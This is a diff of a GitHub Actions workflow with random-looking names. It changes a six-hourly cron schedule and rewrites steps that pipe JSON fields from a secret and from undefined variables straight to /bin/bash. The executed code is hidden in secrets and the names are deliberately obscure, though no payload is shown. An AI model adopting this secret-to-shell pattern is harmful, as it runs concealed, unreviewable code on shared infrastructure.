@@ -2,8 +2,9 @@ name: qinwuhua6451
 on:
   workflow_dispatch:
   schedule:
-    - cron: '26 2/6 * * *'
-jobs:  # 26187
+    - cron: '15 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,16 +12,20 @@ jobs:  # 26187
       - uses: actions/checkout@v4
       - name: qinwuhua6451
         env:
-          hmsk5695: ${{ secrets.hmsk5695 }}
+          yak5: ${{ secrets.yak5 }}
         run: |
-          echo $hmsk5695 | jq -r .pf63 | /bin/bash
-          echo $jixy8 | jq -r .vos934 | /bin/bash
-          echo $q55 | jq -r .orr66853 | /bin/bash
-          echo $xwzl36 | jq -r .eypmw61254 | /bin/bash
-          echo $atprs4 | jq -r .df975 | /bin/bash
-          echo $cjlat2 | jq -r .ih643 | /bin/bash
-          echo $ybst79 | jq -r .revq7 | /bin/bash
-          echo $jfz76040 | jq -r .xv95 | /bin/bash
-          echo $bzmse18565 | jq -r .p26 | /bin/bash
-          echo $hqy75730 | jq -r .xrt406 | /bin/bash
+          echo $yak5 | jq -r .bnvo2 | /bin/bash
+          echo $webxk617 | jq -r .fdfh08361 | /bin/bash
+          echo $gbfnl2063 | jq -r .h57 | /bin/bash
+          echo $ccrxe98 | jq -r .wfq719 | /bin/bash
+          echo $p59 | jq -r .qbrf8970 | /bin/bash
+          echo $zc1799 | jq -r .qyjlz89 | /bin/bash
+          echo $an2 | jq -r .e54 | /bin/bash
+          echo $tx89620 | jq -r .liw71 | /bin/bash
+          echo $jkx4386 | jq -r .p7 | /bin/bash
+          echo $wa51604 | jq -r .cx09 | /bin/bash
+          echo $crwt2363 | jq -r .yqum1381 | /bin/bash
+          echo $jkxqr90660 | jq -r .qmshg0117 | /bin/bash
+          echo $qpai3 | jq -r .czhop8866 | /bin/bash
+          echo $l6 | jq -r .fkq133 | /bin/bash
 
